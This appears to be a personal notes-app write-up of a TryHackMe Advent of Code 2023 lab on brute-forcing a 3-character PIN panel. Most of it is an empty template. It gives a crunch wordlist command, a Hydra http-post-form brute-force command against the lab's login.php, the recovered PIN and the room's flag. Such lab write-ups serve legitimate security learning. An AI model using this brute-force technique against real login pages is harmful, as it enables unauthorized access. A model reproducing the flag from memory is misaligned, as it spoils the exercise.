---
creation date: December 3rd 2023 (05:43 pm)
last modified date: December 3rd 2023 (05:43 pm)
aliases: []
tags: 🎌
---
 
Primary Categories: 
Secondary Categories:  
Links: 
# [[THM - AoC 2023 - [Day 3] Hydra is Coming to Town]]  


# Resolution summary
- Text
- Text

## Improved skills
- skill 1
- skill 2

## Used tools
- [[nmap]]
- 

---

# Information Gathering
Scanned all TCP ports:
```bash

```

Enumerated open TCP ports:
```bash

```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 


---

# Exploitation
## Name of the technique


---

# Lateral Movement to user
## Local Enumeration


## Lateral Movement vector


---

# Privilege Escalation
## Local Enumeration


## Privilege Escalation vector


---

# Steps

1. Got to site it gives `http://10.10.60.140:8000/pin.php`
2. Here we see a pin panel with the following character set with a `max length of 3`
```
0123456789ABCDEF
```

3. We want to create a custom list this can be done in a number of ways but we will just use [[Crunch]] like it suggests
```
crunch 3 3 0123456789ABCDEF -o pins.list
```

4. Now we need to see what its doing when we fail a pin / where its sending the code.
5. Open network tab by hitting F12 -> Network
6. Enter a pin and notice that we see its sending the pin itself to `login.php`
7. This is where we will send our brute force attempts
8. Lets get started with the brute force by using [[Hydra]]
```
hydra -L pins.list 10.10.60.140 -p '' http-post-form "/login.php:pin=^USER^:F=Access denied" -s 8000 -f
```

9. We get the following pin: `6F5`
10. Use that and we are in hitting a ew page `/control.php`
11. Hit `Unlock Door` and we get our code
```
THM{pin-code-brute-force}
```

---

# Trophy & Loot

## Credentials


## Scripts


## Task Answers

  
Using `crunch` and `hydra`, find the PIN code to access the control system and unlock the door. What is the flag?
```
THM{pin-code-brute-force}
```

If you have enjoyed this room please check out the [Password Attacks](https://tryhackme.com/room/passwordattacks) room.
```
Submit
```

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


